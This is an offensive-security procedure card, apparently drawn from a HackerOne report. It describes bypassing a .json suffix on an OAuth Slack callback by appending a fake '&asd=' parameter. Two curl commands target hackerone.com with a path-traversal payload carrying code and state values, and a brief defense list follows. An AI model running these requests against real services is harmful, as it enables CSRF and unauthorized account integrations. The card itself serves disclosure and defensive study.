---
id: proc-005
tags:
  - bypass
  - csrf
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/json-suffix-bypass]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:30.197Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-JSON-Suffix-with-Fake-Parameter

## Summary

This procedure bypasses the .json suffix blocking by appending a fake parameter (&asd=) to the query string, allowing parameter processing in the OAuth callback.

## Description

The .json forces path treatment of queries, but adding &asd= makes the suffix part of a value, preserving code and state. This enables the callback to process, potentially integrating Slack if state matches, though validation prevented full exploit here.

## Requirements

1. Valid code and state params
2. URL encoding for all special chars
3. Session cookie

## Defense

Defensive measures and detection strategies:

- Strip or validate all query params on .json endpoints
- Enforce state binding to user session
- Monitor for unexpected OAuth completions

## Objectives

1. Preserve query parameters past .json
2. Process OAuth callback
3. Achieve partial integration setup

## Instructions

### Step 1: Add Fake Param

**Context**: Append &asd= to make .json a value.

**Command** ([[commands/json-suffix-bypass]]):
```bash
curl -X GET "https://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2Fauth%2Fslack%2Fcallback%3Fcode%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1" -H "Cookie: your_session_cookie"
```

> Expected output: 302 to /anontest5667/integrations if successful, with state check.

### Step 2: Verify Processing

**Context**: Check if callback executes.

**Command** (Follow redirect):
```bash
curl -L -X GET "https://hackerone.com/auth/slack/callback?code=...&state=...&asd=.json" -H "Cookie: your_session_cookie"
```

> Success if redirect to integrations without failure.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/json-suffix-bypass]]

## Tools Used


## Tags

- bypass
- csrf
- parameter
